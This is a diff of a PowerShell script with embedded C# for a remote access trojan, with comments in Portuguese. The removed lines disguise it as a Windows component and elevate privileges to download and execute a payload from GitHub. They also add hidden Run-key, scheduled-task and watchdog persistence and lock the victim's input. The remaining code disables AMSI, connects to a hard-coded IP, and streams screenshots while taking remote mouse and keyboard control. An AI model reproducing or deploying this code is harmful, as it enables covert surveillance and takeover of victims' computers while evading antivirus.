@@ -1,79 +1,10 @@
-<#
-.SYNOPSIS
-Windows Critical System Component
-#>
-
-$logPath = "$env:TEMP\rat_log.txt"
-"[$(Get-Date -Format 'HH:mm:ss')] Script iniciado." | Out-File $logPath -Force
-
 $serverIP = "198.1.195.204"
 $serverPort = 4000
-$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
-$installName = "WinUpdateSvc"
-$dir = "$env:ProgramData\Microsoft\Windows\Caches"
-$scriptPath = "$dir\$installName.ps1"
-$vbsPath = "$dir\$installName.vbs"
+$logPath = "$env:TEMP\rat_log.txt"
 
-# ===== VERIFICAR ADMIN =====
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    "[$(Get-Date -Format 'HH:mm:ss')] Solicitando admin..." | Out-File $logPath -Append
-    try { 
-        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue 
-    } catch {
-        "[$(Get-Date -Format 'HH:mm:ss')] Erro ao elevar: $_" | Out-File $logPath -Append
-    }
-    exit
-}
+"Script iniciado..." | Out-File $logPath -Force
+Write-Host "Compilando agente C#..." -ForegroundColor Cyan
 
-"[$(Get-Date -Format 'HH:mm:ss')] Admin concedido. Argumentos: $args" | Out-File $logPath -Append
-
-# ===== MODO TELA (PREPARA E ESCONDE) =====
-if ($args -notcontains "-hidden") {
-    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
-    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {
-        "[$(Get-Date -Format 'HH:mm:ss')] Erro ao baixar: $_" | Out-File $logPath -Append
-    }
-
-    # Cria VBS para rodar invisível
-    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -hidden", 0, False'
-    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
-
-    attrib +h +s +r $scriptPath 2>$null
-    attrib +h +s +r $vbsPath 2>$null
-
-    # Persistência
-    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
-    try {
-        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
-        $trigger1 = New-ScheduledTaskTrigger -AtStartup
-        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
-        $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
-    } catch {}
-
-    # Esconde e Lança via VBS
-    Add-Type -Name Window -Namespace Console -MemberDefinition '
-    [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-    [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    '
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    if ($consolePtr -ne [IntPtr]::Zero) { [Console.Window]::ShowWindow($consolePtr, 0) }
-
-    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
-    "[$(Get-Date -Format 'HH:mm:ss')] VBS lançado. Fechando tela." | Out-File $logPath -Append
-    exit
-}
-
-# ===== MODO HIDDEN (AGENTE) =====
-"[$(Get-Date -Format 'HH:mm:ss')] Rodando invisível. Compilando C#..." | Out-File $logPath -Append
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -88,32 +19,26 @@ if (-not ("R9KAgent" -as [type])) {
     using System.Threading;
     using System.Net.Sockets;
     using System.Windows.Forms;
-    using Microsoft.Win32;
-    using System.Diagnostics;
 
     public class R9KAgent {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
 
         static string IP;
         static int PORT;
         static bool streaming = false;
         static object writeLock = new object();
-        static bool isLocked = false;
         static int targetX = 0, targetY = 0;
         static bool hasNewPos = false;
-        static string logPath = Path.Combine(Path.GetTempPath(), "rat_log.txt");
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
-            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
             while (true) {
                 TcpClient myClient = null;
                 try {
-                    File.AppendAllText(logPath, "[" + DateTime.Now.ToString("HH:mm:ss") + "] Tentando conectar..." + Environment.NewLine);
+                    Console.WriteLine("Conectando em " + IP + ":" + PORT);
                     myClient = new TcpClient();
                     myClient.Connect(IP, PORT);
                     myClient.NoDelay = true;
@@ -123,7 +48,7 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
-                    File.AppendAllText(logPath, "[" + DateTime.Now.ToString("HH:mm:ss") + "] CONECTOU!" + Environment.NewLine);
+                    Console.WriteLine("CONECTOU AO CONTROLE!");
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
@@ -133,39 +58,12 @@ if (-not ("R9KAgent" -as [type])) {
                         Thread.Sleep(100);
                     }
                 } catch (Exception ex) { 
-                    File.AppendAllText(logPath, "[" + DateTime.Now.ToString("HH:mm:ss") + "] ERRO: " + ex.Message + Environment.NewLine);
+                    Console.WriteLine("ERRO: " + ex.Message);
                     Thread.Sleep(3000); 
                 } finally {
                     streaming = false;
                     try { if (myClient != null) myClient.Close(); } catch {}
                 }
-            }
-        }
-
-        static void WatchdogLoop() {
-            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
-            string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
-            while (true) {
-                try {
-                    if (!File.Exists(scriptPath)) {
-                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
-                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
-                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
-                    }
-                    if (!File.Exists(vbsPath)) {
-                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -hidden\", 0, False";
-                        File.WriteAllText(vbsPath, vbs);
-                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
-                    }
-                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
-                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
-                    }
-                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
-                    }
-                } catch {}
-                Thread.Sleep(5000);
             }
         }
 
@@ -183,13 +81,7 @@ if (-not ("R9KAgent" -as [type])) {
         static void InputLoop() {
             while (true) {
                 try {
-                    if (isLocked) {
-                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) {
-                            Cursor.Position = new Point(targetX, targetY);
-                        }
-                    } else {
-                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
-                    }
+                    if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                 } catch {}
                 Thread.Sleep(10);
             }
@@ -214,22 +106,6 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
-                if (cmd == "uninstall") { 
-                    BlockInput(false); 
-                    try {
-                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
-                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
-                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
-                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
-                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
-                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
-                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
-                    } catch {}
-                    Environment.Exit(0); 
-                }
-                
-                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_LOCKED"); } return; }
-                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_UNLOCKED"); } return; }
                 if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
@@ -283,5 +159,5 @@ if (-not ("R9KAgent" -as [type])) {
 "@
 }
 
-"[$(Get-Date -Format 'HH:mm:ss')] C# compilado. Chamando Agente..." | Out-File $logPath -Append
+Write-Host "C# compilado com sucesso. Iniciando..." -ForegroundColor Green
 [R9KAgent]::Start($serverIP, $serverPort)
